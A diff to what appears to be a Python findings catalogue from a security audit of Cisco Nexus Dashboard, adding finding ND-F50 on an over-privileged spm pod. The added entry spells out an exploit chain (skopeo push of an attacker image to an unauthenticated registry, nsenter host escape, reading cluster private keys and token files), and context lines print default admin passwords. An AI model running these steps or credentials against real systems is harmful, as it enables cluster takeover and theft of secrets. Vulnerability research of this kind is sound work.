@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F49 (CRITICAL). 13 attack chains.
+Findings: ND-F01 (CRITICAL) through ND-F50 (CRITICAL). 13 attack chains.
 """
 
 import socket
@@ -1499,6 +1499,66 @@ FINDINGS = {
         ),
         "chain": "Read site-manager federation-management.tpl from firmware -> base64 decode -> try admin:ins3965! on ND instances and admin:Ciscoins3965! on ACI APICs",
         "combined_with": ["ND-F18", "ND-F31"],
+    },
+    "ND-F50": {
+        "title": "spm Pod — privileged:true + hostNetwork + Root Kubeconfig + Full KMS/OCI/k8_secure hostPath Access",
+        "severity": "CRITICAL",
+        "component": "spm Pod in kube-system (spm.tpl), /bin/spm.bin, priorityClassName: system-cluster-critical",
+        "description": (
+            "The Service Package Manager (spm) runs as a static K8s Pod in kube-system with the most "
+            "dangerous security configuration observed in ND 3.2.2m: "
+            "securityContext.privileged: true + hostNetwork: true + root kubeconfig + 9 hostPath volumes "
+            "covering the entire ND storage hierarchy. "
+            "Deployment: /bin/spm.bin --kubeconfig {{staging}}/kube-config/root "
+            "(where staging = /data/services/k8_secure/staging/). "
+            "privileged: true = full kernel namespace access, capability escalation, device access. "
+            "Combined with hostNetwork: true, any code exec in spm = immediate host root via "
+            "nsenter --mount=/proc/1/ns/mnt -- /bin/bash or equivalent. "
+            "hostPath mounts accessible inside container: "
+            "(1) /data/services/kms_etcd → /data/services/kms_etcd: ALL cluster private keys (ND-F03) "
+            "(2) /data/services/k8_secure → /data/services/k8_secure: known_tokens.csv (ND-F42) + root kubeconfig "
+            "(3) /data/services/oci_repo → /data/services/oci_repo: OCI registry root (all container images) "
+            "(4) /data/firmwared → /data/firmwared: all firmware images "
+            "(5) /var/lib → /var/lib: container runtime state (containerd/crio overlayfs) "
+            "(6) /config: full system syscfg.yaml "
+            "Chain: ND-F29 Zot no-auth OCI push -> replace spm image -> container restart -> "
+            "privileged pod code exec -> nsenter host escape -> full node root."
+        ),
+        "pod_type": "static Pod in kube-system (system-cluster-critical priority)",
+        "security_context": "privileged: true",
+        "network": "hostNetwork: true",
+        "kubeconfig": "{{staging}}/kube-config/root = /data/services/k8_secure/staging/kube-config/root",
+        "hostpath_volumes": {
+            "/data/services/kms_etcd": "ALL cluster TLS private keys (ND-F03 blast radius)",
+            "/data/services/k8_secure": "known_tokens.csv + root kubeconfig (ND-F42)",
+            "/data/services/oci_repo": "OCI registry root — all ND service container images",
+            "/data/firmwared": "all ND firmware packages",
+            "/var/lib": "container runtime state (overlayfs, containerd sockets)",
+            "/config": "system config (syscfg.yaml)",
+            "/etc/containers": "container runtime config (read-only)",
+            "/mnt/atom (subPaths)": "kubectl, spm-lcm, bootstrap binaries",
+        },
+        "exploit": (
+            "# Via ND-F29 (Zot no-auth OCI push)\n"
+            "skopeo copy --dest-tls-verify=false attacker/payload:latest oci://localhost:5000/apic-sn/spm:latest\n"
+            "# Wait for spm pod restart (or kill existing spm pod via cluster-admin)\n"
+            "# Inside spm container (privileged + hostNetwork):\n"
+            "nsenter --mount=/proc/1/ns/mnt --net=/proc/1/ns/net -- /bin/bash\n"
+            "# Now running as host root with full node access\n"
+            "cat /data/services/kms_etcd/certs/v1/kubernetes/server-key.pem\n"
+            "cat /data/services/k8_secure/staging/known_tokens.csv"
+        ),
+        "impact": (
+            "Full ND cluster node root access; ALL KMS private keys readable; "
+            "OCI registry manipulation; static K8s token exfil; container runtime escape. "
+            "Most dangerous single pod in ND 3.2.2m."
+        ),
+        "chain": (
+            "ND-F29 (Zot no-auth push) -> replace spm OCI image -> spm pod restart -> "
+            "privileged+hostNetwork = nsenter host escape -> root on ND master node -> "
+            "read /data/services/kms_etcd (all cluster keys) + known_tokens.csv + OCI image manipulation"
+        ),
+        "combined_with": ["ND-F29", "ND-F03", "ND-F42", "ND-F30"],
     },
     "ND-F49": {
         "title": "system:mond ClusterRole in kube-system — Near-Cluster-Admin Monitoring Daemon with Staging hostPath",
